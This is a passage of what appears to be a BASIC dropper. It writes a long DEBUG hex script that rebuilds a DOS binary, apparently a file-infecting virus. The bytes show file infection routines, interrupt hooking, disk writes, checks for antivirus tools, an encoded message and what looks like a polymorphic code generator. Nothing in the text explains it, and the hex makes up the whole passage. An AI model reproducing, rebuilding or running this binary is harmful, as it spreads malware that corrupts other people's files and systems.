Print #1, ""E 0590 C0 8E D8 8E C0 2E A2 99 05 2E A3 B4 04 BF F0 04""
Print #1, ""E 05A0 B0 EA AA 88 45 EF B8 A6 02 AB C7 45 EE B3 04 8C""
Print #1, ""E 05B0 C8 AB 89 45 EE C3 60 1E 06 6A 00 1F 80 3E 87 00""
Print #1, ""E 05C0 08 77 0D C7 06 F1 04 C3 02 C5 3E 84 00 E8 4B 01""
Print #1, ""E 05D0 07 1F 61 E8 7B 09 2E FF 06 A1 0E 81 FC 00 13 72""
Print #1, ""E 05E0 0B 81 FC 00 16 77 05 80 FC F2 74 69 80 FC 02 74""
Print #1, ""E 05F0 05 80 FC 03 75 41 83 FA 02 72 5D 80 FA 80 75 37""
Print #1, ""E 0600 83 F9 01 75 37 80 FE 01 77 2D 51 FE C8 74 0C 50""
Print #1, ""E 0610 53 80 C7 02 41 E8 E5 08 49 5B 58 B0 01 80 FA 01""
Print #1, ""E 0620 77 08 B9 01 50 E8 D5 08 EB 09 0A F6 75 02 B1 07""
Print #1, ""E 0630 E8 EA 08 59 CA 02 00 2E FF 2E 8F 14 0A F6 75 F7""
Print #1, ""E 0640 50 8C C8 80 FC 7C 58 74 EE 83 F9 11 77 E9 80 F9""
Print #1, ""E 0650 06 72 E4 B4 00 F8 EB DC 83 F9 01 75 DA 50 E8 9C""
Print #1, ""E 0660 08 73 05 44 44 F9 EB EE 58 26 80 BF FD 01 F2 74""
Print #1, ""E 0670 99 60 1E 06 06 1F 0E 07 8B F3 BF 8F 12 B9 00 01""
Print #1, ""E 0680 2E 38 0E 99 05 75 18 F3 A5 80 3F EB 75 11 8B 47""
Print #1, ""E 0690 13 BF F4 11 3D 40 0B 74 08 BF E9 11 3D 60 09 75""
Print #1, ""E 06A0 74 0E 1F B8 1E 35 CD 21 53 06 B4 25 50 52 8B D7""
Print #1, ""E 06B0 CD 21 5A 0E 07 BD 50 00 B1 0A BF 67 12 8B DF 8B""
Print #1, ""E 06C0 C5 AB 8A C1 F6 D8 04 0B B4 02 AB E2 F2 B8 0A 05""
Print #1, ""E 06D0 B9 01 50 E8 27 08 72 38 BB 8F 12 E8 1C 08 72 30""
Print #1, ""E 06E0 41 B8 09 03 33 DB E8 14 08 72 25 89 0E 0C 02 89""
Print #1, ""E 06F0 1E 0F 02 93 BB 8F 12 8A 47 01 97 8D 79 02 BE F8""
Print #1, ""E 0700 01 B9 1E 00 F3 A4 C6 87 FD 01 F2 B1 01 E8 EA 07""
Print #1, ""E 0710 58 1F 5A CD 21 07 1F 61 E9 38 FF B4 30 CD 21 3C""
Print #1, ""E 0720 05 72 09 B4 52 CD 21 06 1F BF 9E 10 B9 01 00 2E""
Print #1, ""E 0730 89 3E 93 14 2E 8C 1E 95 14 8B 05 3C 90 74 05 3D""
Print #1, ""E 0740 03 EB 75 07 8B 7D 08 C4 3D EB 12 3D 2E 3A 75 05""
Print #1, ""E 0750 41 1E 07 EB 08 3C EA 75 13 C4 7D 01 49 B0 9A FC""
Print #1, ""E 0760 AA B8 E0 04 AB 33 C0 AB B0 90 F3 AA C3 B8 00 43""
Print #1, ""E 0770 CD 2F 3C 80 75 1E B8 10 43 CD 2F 2E 89 1E 97 14""
Print #1, ""E 0780 2E 8C 06 99 14 B4 10 8B D7 2E FF 1E 97 14 48 75""
Print #1, ""E 0790 03 8B EB C3 B8 00 58 CD 21 50 B8 01 58 50 BB 80""
Print #1, ""E 07A0 00 CD 21 B8 02 58 CD 21 B4 00 50 B8 03 58 50 B3""
Print #1, ""E 07B0 01 CD 21 B4 48 8B DF CD 21 95 58 5B CD 21 58 5B""
Print #1, ""E 07C0 CD 21 C3 E9 D6 00 2E C6 06 B4 04 D5 60 E8 74 06""
Print #1, ""E 07D0 8B DA B9 80 00 80 FF FF 74 32 80 7F 01 3A 75 2C""
Print #1, ""E 07E0 80 3F 2E 75 24 81 7F FE 4F 50 74 0E 81 7F FE 54""
Print #1, ""E 07F0 41 74 07 81 7F FB 51 43 75 0F FE 07 B8 20 09 33""
Print #1, ""E 0800 DB B1 F0 CD 10 93 E9 8D 00 43 E2 D4 1E 06 B4 52""
Print #1, ""E 0810 CD 21 26 8E 5F FE BE 10 00 80 7C F4 80 B0 00 77""
Print #1, ""E 0820 73 BF 4E 01 E8 46 FF 8B D5 80 FE A0 72 0C 4D 8E""
Print #1, ""E 0830 DD 8B C7 C7 44 F1 08 00 EB 35 1E 80 3C 46 74 05""
Print #1, ""E 0840 80 3C 44 75 21 80 3C 4D 74 12 80 3C 54 74 0D 8B""
Print #1, ""E 0850 44 01 48 8E C0 03 44 03 8E D8 EB E9 8D 03 26 2B""
Print #1, ""E 0860 44 F1 26 89 44 F3 1F 8C D8 2B E8 95 05 4D 01 2E""
Print #1, ""E 0870 8C 1E 8E 05 0E 1F A3 95 05 8E C2 B0 D6 A2 B4 04""
Print #1, ""E 0880 B9 DC 14 33 F6 33 FF FC F3 A4 8E D9 8C 06 E3 04""
Print #1, ""E 0890 8C 06 F3 04 07 1F 2E A2 B4 04 61 CB 1E 68 01 C8""
Print #1, ""E 08A0 1F C7 06 03 00 4E 01 1F EB 68 2E 8C 1E F7 05 0E""
Print #1, ""E 08B0 1F 89 1E E2 05 BB E2 05 89 47 06 89 4F 0C 89 57""
Print #1, ""E 08C0 12 89 77 09 89 7F 0F 89 6F 03 8C 47 19 C6 47 B7""
Print #1, ""E 08D0 68 FF 06 A3 0E FC E8 78 06 8A C4 1E B9 0E 00 07""
Print #1, ""E 08E0 BF 1A 06 F2 AE 75 28 D1 E1 03 D9 68 FF 05 FF 77""
Print #1, ""E 08F0 46 BB 00 00 BD 00 00 B8 00 00 BE 00 00 B9 00 00""
Print #1, ""E 0900 BF 00 00 BA 00 00 68 00 00 1F 68 00 00 07 C3 E8""
Print #1, ""E 0910 0E 00 80 FC 6C 77 01 CB 83 C4 04 32 C0 CA 02 00""
Print #1, ""E 0920 E8 CE FF 2E C6 06 99 05 00 C3 4B 4C 11 12 4E 4F""
Print #1, ""E 0930 42 3F 3E 3D 32 44 25 40 C3 0B 39 0B 29 0B 2D 0B""
Print #1, ""E 0940 68 06 1B 0B B5 0A 84 0A 67 09 49 09 B9 09 B9 09""
Print #1, ""E 0950 1B 0B 4F 06 20 43 4F 20 00 2F 44 3A 46 20 00 3C""
Print #1, ""E 0960 00 74 15 3C 01 75 10 B8 02 3D E8 A8 05 72 08 93""
Print #1, ""E 0970 E8 60 05 B4 3E CD 21 C3 E8 B0 04 50 8B F2 BF 9B""
Print #1, ""E 0980 14 0E 07 AC AA 0A C0 75 FA 0E 1F 59 80 FD 3D 75""
Print #1, ""E 0990 2A C3 81 7D F3 53 4D 75 07 81 7D F9 48 4B 74 0E""
Print #1, ""E 09A0 81 7D F4 43 48 75 D0 81 7D F6 4B 4C 75 C9 E8 6F""
Print #1, ""E 09B0 FF 83 C4 06 B8 02 00 F9 CA 02 00 80 FD 4B 75 11""
Print #1, ""E 09C0 C6 06 81 06 C3 81 7D F9 41 56 75 05 C6 06 81 06""
Print #1, ""E 09D0 90 BE 49 06 81 7D F8 57 49 75 06 80 7D FA 4E 74""
Print #1, ""E 09E0 11 BE 44 06 81 7D F6 42 53 75 39 81 7D F9 41 4E""
Print #1, ""E 09F0 75 32 BF 8F 12 8B DF C6 05 FF 47 AC 0A C0 74 05""
Print #1, ""E 0A00 AA FE 07 EB F6 8B 36 E2 05 8E 1E FB 05 8C C8 87""
Print #1, ""E 0A10 44 04 50 8B C3 87 44 02 96 1F 46 AC AA 2E FF 07""
Print #1, ""E 0A20 3C 0D 75 F7 0E 1F C6 06 B9 09 90 B4 2F CD 21 53""
Print #1, ""E 0A30 06 B4 1A BA 04 12 CD 21 B8 24 35 CD 21 53 06 B4""
Print #1, ""E 0A40 25 50 BA 8D 00 CD 21 B3 00 E8 3B 00 B4 4E B9 27""
Print #1, ""E 0A50 00 E8 DF 00 72 24 BE 00 12 33 FF 80 7C 04 02 77""
Print #1, ""E 0A60 16 52 B5 04 BA F5 03 B0 04 EE E2 FE B5 04 EE E2""
Print #1, ""E 0A70 FE EC A8 40 5A 75 03 E8 1D 00 58 1F 5A CD 21 B4""
Print #1, ""E 0A80 1A 1F 5A CD 21 B3 00 60 B8 02 FA BA 45 59 CD 16""
Print #1, ""E 0A90 2E 88 0E 76 07 61 C3 39 7C 20 75 07 81 7C 1E 11""
Print #1, ""E 0AA0 27 72 F3 B4 2A CD 21 8B 44 1C D1 E8 80 E9 BC 3A""
Print #1, ""E 0AB0 E1 75 09 C1 E8 04 24 0F 3A C6 74 DA 8A 44 19 24""
Print #1, ""E 0AC0 07 74 08 B8 01 43 33 C9 E8 68 00 B8 02 3D E8 62""
Print #1, ""E 0AD0 00 72 53 93 B8 00 57 CD 21 51 52 B4 3F E8 68 01""
Print #1, ""E 0AE0 72 38 80 7C 18 40 74 32 8B 04 02 C4 3C A7 75 2A""
Print #1, ""E 0AF0 8B 44 04 48 33 D2 BD 00 02 F7 E5 03 44 02 13 D7""
Print #1, ""E 0B00 39 44 1E 75 15 39 54 20 75 10 B0 02 E8 43 01 E8""
Print #1, ""E 0B10 23 02 74 06 E8 14 03 E8 20 00 B8 01 57 5A 59 E8""
Print #1, ""E 0B20 F3 03 B4 3E CD 21 B8 01 43 33 C9 8A 4C 19 80 F9""
Print #1, ""E 0B30 20 74 06 BA 9B 14 E9 DC 03 C3 8B 44 0E A3 75 00""
Print #1, ""E 0B40 8B 44 10 A3 71 00 8B 44 14 A3 81 00 8B 44 16 A3""
Print #1, ""E 0B50 7B 00 8B 44 0C 80 FC FF 74 12 8B 44 04 99 B9 20""
Print #1, ""E 0B60 00 F7 E1 2B 44 08 03 44 0C 05 10 00 A3 56 00 B4""
Print #1, ""E 0B70 00 CD 1A 52 92 B4 F2 2A E0 F7 D8 89 44 22 58 8A""
Print #1, ""E 0B80 CC 25 1F 00 C1 E0 04 A3 FE 08 8B 54 1E 83 E2 0F""
Print #1, ""E 0B90 03 C2 A3 AD 0E 80 E1 1F 89 0E 0B 09 8B 44 1E 05""
Print #1, ""E 0BA0 24 12 8B D0 0C 1F 2B C2 A3 E6 08 50 68 00 BE 07""
Print #1, ""E 0BB0 33 FF 26 81 3D 20 07 74 02 58 C3 E8 0C 04 B4 40""
Print #1, ""E 0BC0 B9 00 12 E8 90 00 3B C1 59 C7 05 20 07 0E 1F 75""
Print #1, ""E 0BD0 E9 B6 13 E8 3D 03 B9 24 00 BA 00 12 E8 5F 03 E8""
Print #1, ""E 0BE0 31 03 E8 59 03 E8 68 00 8B 44 1E 8B 54 20 50 52""
Print #1, ""E 0BF0 05 24 12 13 D7 05 17 00 13 D7 F7 F5 40 89 44 04""
Print #1, ""E 0C00 89 54 02 5A 58 F7 36 5A 08 2B 44 08 50 B9 60 00""
Print #1, ""E 0C10 C1 E9 04 2B C1 89 44 16 58 48 05 04 00 89 44 0E""
Print #1, ""E 0C20 03 16 FE 08 89 54 14 B8 00 16 8B 16 0B 09 C1 E2""
Print #1, ""E 0C30 04 2B C2 89 44 10 81 44 0A 61 01 8B 44 0A 39 44""
Print #1, ""E 0C40 0C 77 03 89 44 0C B4 40 B9 19 00 8B D6 E9 C5 02""
Print #1, ""E 0C50 B0 00 B4 42 33 C9 99 EB F4 FC 0E 07 8B F2 BF 9B""
Print #1, ""E 0C60 14 8B CF AC AA 3C 5C 75 02 8B CF 0A C0 75 F4 2E""
Print #1, ""E 0C70 89 0E 79 09 E8 7A FC 83 C4 06 CD 21 72 43 50 E8""
Print #1, ""E 0C80 83 00 72 3B 1E 8D 77 1E BF 9B 14 BA 9B 14 B9 0D""
Print #1, ""E 0C90 00 0E 07 F3 A4 07 0E 1F 8B F3 B8 00 3D E8 75 02""
Print #1, ""E 0CA0 72 1D 93 E8 85 01 E8 8C 00 9C B4 3E CD 21 9D 75""
Print #1, ""E 0CB0 0E A1 61 12 26 89 44 1A A1 63 12 26 89 44 1C 58""
Print #1, ""E 0CC0 F8 50 E8 5B FC 58 CA 02 00 90 83 C4 06 CD 21 3C""
Print #1, ""E 0CD0 00 75 EE 50 E8 2E 00 72 E6 0E 07 8D 77 FE BF 43""
Print #1, ""E 0CE0 12 8B D7 FC B9 08 00 E8 12 00 B0 2E AA 8D 77 06""
Print #1, ""E 0CF0 B1 03 E8 07 00 B0 00 AA 1E 07 EB 9E AC 3C 20 74""
Print #1, ""E 0D00 03 AA E2 F8 C3 B4 2F CD 21 06 1F 80 3F FF 75 03""
Print #1, ""E 0D10 83 C3 07 2E 80 3E E9 05 12 77 03 83 C3 03 8A 47""
Print #1, ""E 0D20 1A 24 1F 3C 1F 74 02 F9 C3 83 7F 1C 00 75 05 81""
Print #1, ""E 0D30 7F 1A 11 27 C3 B8 00 44 CD 21 A8 80 75 55 0E 1F""
Print #1, ""E 0D40 B0 01 E8 0D FF 72 4C A3 63 0A 89 16 66 0A 80 FB""
Print #1, ""E 0D50 00 74 27 B8 02 42 B9 FF FF BA DC FF CD 21 88 1E""
Print #1, ""E 0D60 40 0A B4 3F B9 24 00 BA 43 12 CD 21 E8 CF 01 B8""
Print #1, ""E 0D70 00 42 BA 00 00 B9 00 00 CD 21 80 3E 43 12 5A 74""
Print #1, ""E 0D80 07 80 3E 43 12 4D 75 0B 50 A1 65 12 F7 D8 02 C4""
Print #1, ""E 0D90 3C F2 58 C3 3C 02 75 FB E8 9A FF 75 F6 83 C4 06""
Print #1, ""E 0DA0 E8 4E FB 51 B0 00 2E 8B 0E 63 12 2E 8B 16 61 12""
Print #1, ""E 0DB0 2E 03 16 F4 05 83 D1 00 2E 03 0E EE 05 CD 21 E8""
Print #1, ""E 0DC0 61 FB 59 EB 63 51 E8 6C FF 5D 75 C7 83 C4 06 BE""
Print #1, ""E 0DD0 43 12 2B 44 1E 83 DA 00 2B 54 20 78 08 E8 40 FB""
Print #1, ""E 0DE0 2B C0 F8 EB 43 03 C5 83 D2 00 75 02 2B E8 55 E8""
Print #1, ""E 0DF0 FF FA 59 CD 21 9C 50 72 2A 1E 07 8B FA 0E 1F BE""
Print #1, ""E 0E00 43 12 83 3E 66 0A 00 75 1A A1 63 0A 3D 18 00 73""
Print #1, ""E 0E10 12 03 F0 03 C8 83 F9 18 76 06 2D 18 00 F7 D8 91""
Print #1, ""E 0E20 FC F3 A4 E8 FA FA 58 9D CA 02 00 2E C6 06 40 0A""
Print #1, ""E 0E30 00 2E C7 06 65 12 00 00 C3 3C 52 75 06 2E C6 06""
Print #1, ""E 0E40 B9 09 C3 C3 80 FC 25 75 78 8B F2 81 3C CD 30 75""
Print #1, ""E 0E50 13 2E C5 16 8F 14 1E 07 8B C2 B7 13 93 CD 2F A1""
Print #1, ""E 0E60 FF FF EB FE 8B 04 3C EB 75 11 81 7C 07 FA 9C 75""
Print #1, ""E 0E70 0A 81 7C 09 FC 53 75 03 C6 04 A8 3D FA 9C 75 0B""
Print #1, ""E 0E80 81 7C 04 F6 06 75 04 C6 44 09 EB 3D 2E 83 75 13""
Print #1, ""E 0E90 81 7C 09 50 55 75 0C 80 BC 6E 01 E8 75 05 C6 84""
Print #1, ""E 0EA0 6E 01 C3 3D CD 30 75 02 EB FE 3D FB 2E 75 13 81""
Print #1, ""E 0EB0 7C 07 75 03 75 0B 81 7C 0D FC FA 75 04 C6 44 08""
Print #1, ""E 0EC0 00 C3 3D 9C EB 75 FA 81 7C 02 00 80 75 F3 C6 44""
Print #1, ""E 0ED0 07 00 C3 E8 5F FE 75 E9 E8 75 FD BE 43 12 E8 65""
Print #1, ""E 0EE0 FD 72 14 B8 00 42 8B 0E 63 12 8B 16 61 12 CD 21""
Print #1, ""E 0EF0 B4 40 33 C9 E8 1E 00 E9 75 FE B8 01 03 53 33 DB""
Print #1, ""E 0F00 E8 84 FB 5B FA 9C 2E FF 1E 8F 14 53 9C E8 75 FB""
Print #1, ""E 0F10 9D 5B C3 B4 40 FA 9C 2E FF 1E 93 14 C3 E8 03 00""
Print #1, ""E 0F20 E8 DA FF 60 8B F3 8B FB 8A CE BA AD DE D3 E2 B9""
Print #1, ""E 0F30 FF 00 26 AD 33 C2 83 C2 7F AB E2 F6 61 C3 60 8B""
Print #1, ""E 0F40 F2 8A 5C 23 49 AC 32 C3 02 D9 88 44 FF E2 F6 61""
Print #1, ""E 0F50 C3 C3 60 B9 01 00 E2 FE 2E FE 06 44 0C 75 1E B8""
Print #1, ""E 0F60 03 00 CD 10 B4 02 B7 00 BA 03 0C CD 10 BE 6F 0C""
Print #1, ""E 0F70 2E AC 34 F5 CD 29 0A C0 75 F6 98 CD 16 61 C3 C9""
Print #1, ""E 0F80 BD B4 A3 BA B6 CB D5 97 8C D5 BB 90 80 87 9A 97""
Print #1, ""E 0F90 94 86 9D 90 87 D2 CC C6 DA B2 90 87 98 94 9B 8C""
Print #1, ""E 0FA0 D5 31 B2 A7 BC A5 A5 B0 B1 31 B7 AC 31 B3 B0 B4""
Print #1, ""E 0FB0 A7 31 A0 BB A1 BC B9 31 B1 B0 B4 A1 BD 31 A0 A6""
Print #1, ""E 0FC0 31 B1 BA 31 A5 B4 A7 A1 31 F5 60 33 F6 B9 DC 14""
Print #1, ""E 0FD0 F3 A4 BE 9A 0E 2B FF 33 C0 A3 2E 0E C6 06 37 0E""
Print #1, ""E 0FE0 35 A3 38 0E C7 44 99 90 90 C6 44 98 05 B4 2C CD""
Print #1, ""E 0FF0 21 89 4C 03 89 54 05 B4 2A CD 21 89 0C 88 44 02""
Print #1, ""E 1000 52 B4 00 CD 1A 87 E9 59 87 F3 FC 8B C1 03 C2 33""
Print #1, ""E 1010 C5 89 47 59 8B C2 0B C5 D1 C0 F7 D8 89 47 6F 89""
Print #1, ""E 1020 47 94 68 9B 11 68 63 11 B8 42 11 FF D0 58 FF D0""
Print #1, ""E 1030 58 FF D0 A1 13 0D 87 06 16 0D 87 06 19 0D F6 C1""
Print #1, ""E 1040 01 74 04 87 06 16 0D A3 13 0D B0 0F E8 81 03 89""
Print #1, ""E 1050 7F 0B 8B F1 83 E6 07 D1 E6 83 FE 06 72 11 83 FE""
Print #1, ""E 1060 08 77 0C B0 F8 F6 C5 02 74 01 40 AA 88 47 96 F6""
Print #1, ""E 1070 47 09 03 75 03 B0 2E AA F6 47 03 03 75 0B 83 C6""
Print #1, ""E 1080 10 83 FE 18 77 03 B0 81 AA FF 50 A8 B8 AF 11 BE""
Print #1, ""E 1090 C0 11 F6 C2 01 75 01 96 56 FF D0 58 FF D0 B0 0F""
Print #1, ""E 10A0 E8 2D 03 8B 77 07 83 E6 03 D1 E6 FF 50 D8 E8 1D""
Print #1, ""E 10B0 03 8A 47 05 25 03 00 96 81 C6 8A 0E A4 89 7F 0D""
Print #1, ""E 10C0 AA E8 0A 03 83 FD 13 72 0F F6 47 03 03 75 09 B8""
Print #1, ""E 10D0 33 C9 AB B0 E3 AA EB 0B 8B 77 06 83 E6 03 81 C6""
Print #1, ""E 10E0 8E 0E A4 8B 47 0B 2B C7 48 26 80 7D FF E9 74 03""
Print #1, ""E 10F0 AA EB 02 48 AB 57 B0 68 AA 8B 47 13 05 40 00 AB""
Print #1, ""E 1100 B0 C3 AA 5F 8B 47 0D 8B F0 F7 D8 03 C7 48 26 88""
Print #1, ""E 1110 04 B8 42 12 8B 77 11 2B C7 03 47 13 26 89 04 8B""
Print #1, ""E 1120 77 0F 8B C7 03 47 13 B9 05 00 06 1F 80 3C FE 75""
Print #1, ""E 1130 02 88 04 80 3C FF 75 02 88 24 46 E2 EF B8 82 76""
Print #1, ""E 1140 F8 29 05 90 90 47 47 35 00 00 81 FF 01 12 72 F0""
Print #1, ""E 1150 61 C3 69 0F 7C 0F 86 0F 8A 0F 94 0F 98 0F A3 0F""
Print #1, ""E 1160 AE 0F FF 0E 2A 0F 39 0F 3D 0F 46 0F 98 0F A3 0F""
Print #1, ""E 1170 AE 0F E1 0E E1 0E FA 0E 0D 0F CB 0F EC 0F F5 0F""
Print #1, ""E 1180 13 10 28 10 35 10 47 10 56 10 6E 10 79 10 80 10""
Print #1, ""E 1190 8E 10 8B C6 89 F0 8D 04 56 58 74 77 73 74 EB 75""
Print #1, ""E 11A0 E9 72 62 11 50 11 59 11 59 11 00 00 00 00 00 00""
Print #1, ""E 11B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06""
Print #1, ""E 11C0 07 03 03 04 05 07 07 01 02 05 08 10 28 74 7D 5F""
Print #1, ""E 11D0 5F EC 10 E9 10 34 11 ED 10 13 11 F5 10 F9 10 0B""
Print #1, ""E 11E0 11 17 11 23 11 F1 10 FE 10 3A 11 3E 11 2B 11 02""
Print #1, ""E 11F0 11 B8 C0 05 F6 C6 01 74 03 B8 E8 2D E8 5B 00 88""
Print #1, ""E 1200 67 9D B8 CC 45 AB 89 47 9E C3 B8 F0 35 EB ED B0""
Print #1, ""E 1210 30 E8 5B 00 C6 47 97 31 B8 82 76 AB C3 4F B0 D1""
Print #1, ""E 1220 AA 88 47 9D B8 C0 C0 F6 C6 01 74 03 B8 C8 C8 E8""
Print #1, ""E 1230 28 00 B0 90 86 C4 89 47 9E C3 B0 00 E8 30 00 34""
Print #1, ""E 1240 28 24 F8 40 88 47 97 EB CF B0 28 EB EF B0 10 E8""
Print #1, ""E 1250 1D 00 34 08 EB EB B0 18 EB F5 8B 77 03 83 E6 03""
Print #1, ""E 1260 02 40 1C AA C3 8B F2 83 E6 03 02 40 15 AA C3 8B""
Print #1, ""E 1270 F2 83 E6 03 02 40 19 AA C3 B0 31 AA 88 47 97 B0""
Print #1, ""E 1280 00 8B 77 03 83 E6 03 02 40 1F EB E3 B0 01 AA 34""
Print #1, ""E 1290 28 88 47 97 EB E9 B0 29 EB F4 B0 11 AA 34 08 88""
Print #1, ""E 12A0 47 97 EB DB B0 19 EB F4 B8 F7 15 AA 89 47 97 B0""
Print #1, ""E 12B0 10 EB BC B8 F7 1D AA 89 47 97 B0 18 EB B1 B0 D1""
Print #1, ""E 12C0 AA 88 47 97 B0 00 F7 C5 01 00 74 02 34 08 E8 9E""
Print #1, ""E 12D0 FF 24 08 0C 05 34 08 88 47 98 C3 F6 C1 05 74 0E""
Print #1, ""E 12E0 B0 40 E8 80 FF 50 B0 0F E8 E5 00 58 AA C3 B0 FF""
Print #1, ""E 12F0 AA B0 C0 E8 6F FF 26 8B 45 FE AB C3 B4 C0 E8 13""
Print #1, ""E 1300 00 B0 02 EB 07 B4 E8 E8 0A 00 B0 FE F6 C6 03 74""
Print #1, ""E 1310 44 98 AB C3 B0 83 F6 C6 03 74 02 34 02 AA 8A C4""
Print #1, ""E 1320 E9 42 FF B0 8D AA 8B F2 83 E6 03 8A 40 23 F6 C6""
Print #1, ""E 1330 03 74 02 04 40 AA EB C9 B0 81 AA B0 F8 E8 25 FF""
Print #1, ""E 1340 89 7F 11 AB C3 B0 B8 AA E8 F5 FF B0 2B AA B0 C0""
Print #1, ""E 1350 E8 12 FF B0 F5 AA C3 B0 B8 AA E8 E3 FF B8 F7 D8""
Print #1, ""E 1360 AB B0 03 AA EB E8 8B C2 24 03 75 CC 8B 77 09 83""
Print #1, ""E 1370 E6 03 D1 E6 81 C6 82 0E A5 B0 3D AA EB C2 B0 B8""
Print #1, ""E 1380 02 46 02 AA 8B 46 04 AB C3 B0 C7 AA B0 C0 EB F0""
Print #1, ""E 1390 B0 8D AA 8A 46 02 98 C1 E0 03 04 06 EB E5 80 7E""
Print #1, ""E 13A0 02 04 77 1C B0 B0 8A 66 04 02 46 02 96 B0 B4 8A""
Print #1, ""E 13B0 66 05 02 46 02 F7 C7 01 00 75 01 96 AB 96 AB C3""
Print #1, ""E 13C0 B0 68 AA 8B 46 04 AB B0 58 02 46 02 AA C3 B0 09""
Print #1, ""E 13D0 98 96 E8 0D 00 25 0F 00 3B C6 77 F6 D1 E0 96 FF""
Print #1, ""E 13E0 60 27 53 1E 0E 1F BB 97 04 8B 07 1F 43 03 DF 80""
Print #1, ""E 13F0 E7 1F 2E 89 1E D7 10 5B C3 B0 FC AA C3 B0 FD AA""
Print #1, ""E 1400 C3 B0 90 AA C3 B0 FA AA C3 B0 FB AA C3 C3 B0 98""
Print #1, ""E 1410 AA C3 B8 F8 73 AB B8 01 EA AB C3 B0 B0 AA E8 C1""
Print #1, ""E 1420 FF AA C3 B0 B4 EB F6 B0 8B AA E8 B5 FF 24 07 04""
Print #1, ""E 1430 C0 AA C3 B0 B8 AA E8 A9 FF AB C3 B8 B4 4D AB B8""
Print #1, ""E 1440 CD 21 AB C3 B8 8D 06 AB EB EC B0 25 EB E7 B0 0D""
Print #1, ""E 1450 EB E3 E8 79 FF 8B 77 09 83 E6 03 D1 E6 FF 60 F8""
Print #1, ""E 1460 B8 8C C8 AB B8 8E D8 AB C3 B0 0E AA E8 5F FF B0""
Print #1, ""E 1470 1F AA C3 8A C1 24 07 3C 04 77 54 F6 47 03 03 74""
Print #1, ""E 1480 4E E8 4A FF 8B 47 6F 89 47 94 50 8B 77 03 83 E6""
Print #1, ""E 1490 03 8A 40 1C 8B 77 03 98 50 C1 EE 03 83 E6 03 55""
Print #1, ""E 14A0 8B EC D1 E6 FF 50 E0 5D 58 58 C3 E8 20 FF 89 7F""
Print #1, ""E 14B0 0F 6A FE 8B F2 83 E6 03 8A 40 15 8B F2 EB D8 B0""
Print #1, ""E 14C0 0F E8 0C FF 8B 77 04 83 E6 03 D1 E6 FF 50 D0 C3""
Print #1, ""E 14D0 8A C1 24 07 3C 04 77 F7 8A C5 25 03 00 D1 E0 96""
Print #1, ""E 14E0 74 ED F6 47 03 03 74 E7 56 B0 0F E8 E2 FE 5E B0""
Print #1, ""E 14F0 81 AA FF 60 C8 E9 11 F4 11 DF 02 25 02 0F 1B FF""
Print #1, ""E 1500 54 F6 0F 08 DF 02 25 02 12 1B FF 6C F6 0F 08 00""
Print #1, ""E 1510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 15F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 16F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1710 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 17A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 17B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 17C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
